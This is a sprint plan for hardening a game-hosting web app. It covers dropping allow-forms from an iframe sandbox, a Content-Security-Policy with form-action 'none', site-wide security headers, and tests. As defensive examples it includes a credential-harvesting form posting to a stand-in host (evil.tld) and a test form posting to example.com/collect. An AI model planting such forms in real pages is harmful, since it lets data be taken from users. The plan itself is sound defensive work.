# Sprint 1 — Browser-Enforced Hardening (CSP + Sandbox + Security Headers)

See [00-overview.md](00-overview.md) for the full rationale. This sprint
touches only `app.py` and `templates/index.html` — no schema, no
pipeline, no `safety.py` changes. It closes the sharpest gap from the
review immediately: a generated game with a `<form action="https://evil.tld">`
credential-harvesting form currently passes every existing check (the
`safety.py` `src=`/`href=` regex never looks at `action=`, and the iframe
sandbox explicitly grants `allow-forms`). This sprint makes that fail at
the browser level regardless of what `safety.py` does or misses.

## Part A: tighten the iframe sandbox

- In `templates/index.html:160`, drop `allow-forms` from the game
  `<iframe>`'s `sandbox` attribute:
  `sandbox="allow-scripts allow-pointer-lock"`.
- Confirm this doesn't break legitimate gameplay: sandboxing without
  `allow-forms` still renders `<form>`/`<input>`/`<textarea>` elements
  and still fires their `input`/`change`/`keydown` JS events normally —
  it only blocks the browser's native form *submission* (navigation).
  Games use on-screen inputs for things like "enter your name for the
  high score," never an actual off-origin POST, so nothing in a
  legitimate game should rely on the dropped capability.
- Leave `allow-scripts` and `allow-pointer-lock` as-is — both are needed
  for any interactive game to run at all, and neither grants network or
  storage/parent access on their own (that's what the missing
  `allow-same-origin` already blocks, unchanged by this sprint).

## Part B: CSP on the served game HTML

- In `app.py`'s `/play/<slug>` route (around `app.py:486`), attach a
  `Content-Security-Policy` header to the `send_from_directory` response
  before returning it:
  ```
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com https://unpkg.com https://ajax.googleapis.com https://threejs.org;
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: blob:;
  connect-src 'self';
  form-action 'none';
  frame-ancestors 'self';
  base-uri 'none';
  ```
  - The `script-src`/`style-src`/`font-src` hosts must match
    `safety.ALLOWED_CDN_HOSTS` exactly — import the set from `safety.py`
    and build the header string from it rather than hand-duplicating the
    list, so the two never drift apart.
  - `form-action 'none'` is the load-bearing line for the gap this
    sprint targets: even if a game's markup contains a `<form
    action="https://evil.tld">`, the browser refuses the submission.
  - `connect-src 'self'` blocks `fetch`/`XHR`/`WebSocket` calls to any
    off-allowlist host at the browser level — a backstop for the
    JS-constructed-URL bypass Sprint 3 also targets from the server side.
    Games have no legitimate reason to call out to arbitrary hosts, so
    this is safe to leave tight (no exceptions beyond `'self'`).
  - `unsafe-eval` is regrettably required in `script-src` because
    `safety.py` already permits some CDN libraries (e.g. three.js
    builds) that may rely on dynamic code generation; if Sprint 2 or a
    follow-up tightens `safety.py` to ban `eval`-adjacent patterns more
    aggressively, revisit dropping this.
  - `frame-ancestors 'self'` stops a generated game's `index.html` from
    ever being loaded directly in a third-party page's iframe — it should
    only ever appear inside vibegames' own `/play/<slug>` iframe.
- Do **not** apply this CSP to any other route — it's specific to the
  untrusted-content route. The parent app pages (menu, admin, forms) get
  their own headers in Part C.

## Part C: baseline security headers on every response

- In the existing `@app.after_request` hook (`app.py:834`, currently
  just `_log_access`), add (or add a second `after_request` hook,
  implementer's choice) these headers on every response:
  - `X-Content-Type-Options: nosniff`
  - `Referrer-Policy: same-origin`
  - `X-Frame-Options: DENY` on every route *except* `/play/<slug>`
    (which needs to be frameable by vibegames' own menu page) — simplest
    is to skip this header when `request.path.startswith("/play/")` and
    rely on that route's own `frame-ancestors 'self'` from Part B
    instead.
- These are cheap, apply site-wide, and protect the *parent* site (menu,
  admin, account pages) from being framed/sniffed — independent of the
  per-game CSP in Part B, which protects players from a malicious game's
  content instead.

## Tests

Add `tests/test_security_headers.py`:
- `GET /play/<slug>` (use the existing `games_dir`/`isolated_db` fixtures
  and register a real bundled game, e.g. block-dodge) returns a response
  whose `Content-Security-Policy` header contains `form-action 'none'`
  and `connect-src 'self'`.
- `GET /` (menu page) returns `X-Frame-Options: DENY` and
  `X-Content-Type-Options: nosniff`; `GET /play/<slug>` does not carry
  `X-Frame-Options` (or carries a value compatible with being framed by
  `/`).
- Assert the CSP's `script-src` host list is byte-for-byte derived from
  `safety.ALLOWED_CDN_HOSTS` (e.g. by parsing the header and diffing the
  host set against the constant) so the two can never silently drift.

## Manual verification

1. `python3 app.py`, open the site, play any game, open browser devtools
   → Network → the `/play/<slug>` response headers show the CSP from
   Part B.
2. Drop a throwaway game directory into `games/` whose `index.html`
   contains `<form action="https://example.com/collect"><input
   name="x"><button>Submit</button></form>`; play it, submit the form,
   and confirm devtools' console shows a CSP `form-action` violation and
   no navigation/request to `example.com` occurs. Delete the throwaway
   directory afterward.
3. Confirm normal gameplay (keyboard/mouse/pointer-lock input, on-screen
   text inputs for e.g. a high-score name entry) still works identically
   on a couple of existing bundled games after the sandbox change in
   Part A.

## Acceptance criteria

- `allow-forms` is removed from the game iframe's `sandbox` attribute
  and existing bundled games still play correctly.
- `/play/<slug>` responses carry the CSP from Part B, with `form-action
  'none'` and a `script-src`/`style-src` host list generated from
  `safety.ALLOWED_CDN_HOSTS`.
- All other routes carry `X-Content-Type-Options: nosniff` and
  `X-Frame-Options: DENY` (except `/play/<slug>` itself).
- `pytest` passes, including the new `tests/test_security_headers.py`.
- No existing test regresses (`pytest` full suite green).
